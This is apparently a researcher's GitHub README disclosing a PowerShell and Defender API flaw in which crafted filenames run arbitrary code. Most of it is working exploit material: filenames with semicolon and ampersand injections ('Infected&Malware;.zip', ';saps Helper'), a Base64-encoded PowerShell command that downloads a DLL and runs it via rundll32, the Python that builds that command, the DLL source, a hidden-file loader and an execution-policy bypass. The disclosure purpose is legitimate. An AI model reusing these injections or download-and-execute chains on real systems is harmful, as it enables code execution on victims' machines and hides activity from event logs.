# PSTrojanFile
Windows PowerShell Filename and Defender Anti-Malware API - Code Execution POC <br>  
Discovery: John Page (aka hyp3rlinx) 2019 and revisted 2023

Updated Dec 24, 2023 <br>

Bypassing single quotes obstacle in PowerShell for code exec and bonus PS Windows Event log fail! <br>
Semicolon and friend "&" operator join forces for arbitrary code exec capabilities. <br>

Run some unwanted malware: <br>
C:\Users\gg\Downloads>powershell get-filehash  'Infected&ScanMe;.zip'  -algorithm  md5 <br>

OR <br>

Windows defender Anti-malware scan: <br>
powershell Start-MpScan -Scanpath 'C:\Users\gg\Downloads\Infected&Malware;.zip' <br>

Where Malware.exe lives in the same directory, think drive-by download. <br>

Windows Event log fail, PS event ID 403, fails to show full path and filename due to truncating: <br>
E.g. <br>
HostApplication=powershell Start-MpScan -Scanpath 'C:\Users\gg\Downloads\Infected <br>
EngineVersion=5.1.19041.3803 <br>

Call ping cmd? why not<br>
C:\>powershell get-filehash  'powerfail&ping 8.8.8.8&.txt'  -algorithm  md5 <br>

Logoff victim: <br>
C:\>powershell Start-MpScan -Scanpath 'virus&logoff&test.zip' <br>

Updated: Dec 7, 2023 added CL and Windows Defender API vector, see below:

Since it still works, I dusted off and made minor improvements: <br> 
1) Execute a remote DLL using rundll32
2) Execute an unintended secondary PS1 script or local text-file (can be hidden)
3) Updated the PS1 Trojan Filename Creator Python3 Script

First reported to Microsoft back in 2019 yet remains unfixed as of the time of this writing. <br>  
Remote code execution via a specially crafted filename. <br>  

The flaw is due to semicolon ";" we can decode a Base64 command and execute straight from the PS1 filename or just exec commands.

Test;POweRsHeLL -e [BASE64 UTF-16LE PAYLOAD];.ps1 <br>  

Call commands straight away <br>  

"Testing;saps (gc -) PoC;.ps1"

Vectors: double click, drag and drop to PS shortcut

Leverages alternate shorthand PS commands like "saps", "gc" start a process and get-content etc.

DLL Execution Example: <br>  
=======================
Create a trojan PS1 file that will try to download and execute a remote DLL named "1.d"

Python: <br>  
from base64 import b64encode <br>  

b64encode("saps  http[]//127.0.0.1/1.d;sleep -s 2;rundll32 $HOME\\Downloads\\1.d, 0".encode('UTF-16LE')) <br>  

cwBhAHAAcwAgACAAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQAvADEALgBkADsAcwBsAGUAZQBwACAALQBzACAAMgA7AHIAdQBuAGQAbABsADMAMgAgACQASABPAE0ARQBcAEQAbwB3AG4AbABvAGEAZABzAFwAMQAuAGQALAAgADAA

DLL Code: <br>  

#include <windows.h> <br> 

//gcc -shared -o mydll.dll mydll.c -m32 <br>  

//hyp3rlinx <br>  

void evilo(void){ <br>  

MessageBox(0,"Filename Remote Code Execution PoC\r\nBy hyp3rlinx","M$ Windows PowerShell",1); <br>  

} <br>  

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){ <br>  

evilo(); <br>  

return 0; <br>  

} <br>  


python -m http.server 80

Double click the trojan PS1 file. <br>  


Text-file Code Execution Example: <br> 
======================================

Create a PS1 file with name including saps "start a process" and gc "get-content", this will read commands from hidden file. <br>  

"Test;saps (gc -) PoC;.ps1" <br>  

Create hidden: attrib +s +h "-" <br>  

Double click or drag and drop.

Requirements: <br>  
=====================

a) PowerShell PS1 files must be set to open with PowerShell as the default program <br>  

b) Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force <br>  

c) User must double-click, run from cmd line or drag and drop the maliciously named PS1 script <br>  


https://www.youtube.com/watch?v=-ZJnA70Cf4I

https://github.com/hyp3rlinx/PSTrojanFile/assets/12366009/029d41d2-af58-434d-8d0f-0bf8f01d1c55

![PSTrojanFile](https://github.com/hyp3rlinx/PSTrojanFile/assets/12366009/31317076-6ceb-4b28-8062-9c8863b0831d)

Update: Microsoft Defender Anti-Malware PowerShell API - Arbitrary Code Execution.

Microsoft Defender Anti Malware and or PS API's can result in executing arbitrary code.
E.g. scan a directory, shortcut .lnk or even non-existent item, may execute unintended code.
This vector builds upon my previous advisory and subsequent project PSTrojanFile.

Requirements:
1) On CL 'powershell' cmd is prefixed or passed in by calling PowerShell from another script
2) Executable file of same name as the parameter that lives nearby

Examples: <br>
powershell Start-MpScan -Scanpath "C:\Users\gg\Downloads\;saps Helper;.1.zip"
(Helper.exe lives on Desktop)

Create directory  ";saps Test", Test.exe, Test.cmd etc is on same CL path <br>
powershell Add-MpPreference -ControlledFolderAccessAllowedApplications ";saps Test"

Create directory with semicolon, drop PE file named doom.exe in same path.  <br>
powershell Set-ProcessMitigation -PolicyFilePath  "test;saps doom"

Last but not least:
When grabbing a file hash in PowerShell logs you out  :)  <br>
c:\>powershell  get-filehash  -algorithm MD5 "Malware;saps logoff.exe"  <br>

https://www.youtube.com/watch?v=0Go6yJiRWP8

https://github.com/hyp3rlinx/PSTrojanFile/assets/12366009/b033b9f8-1ea0-4ea3-9fa3-56ea63db5b08



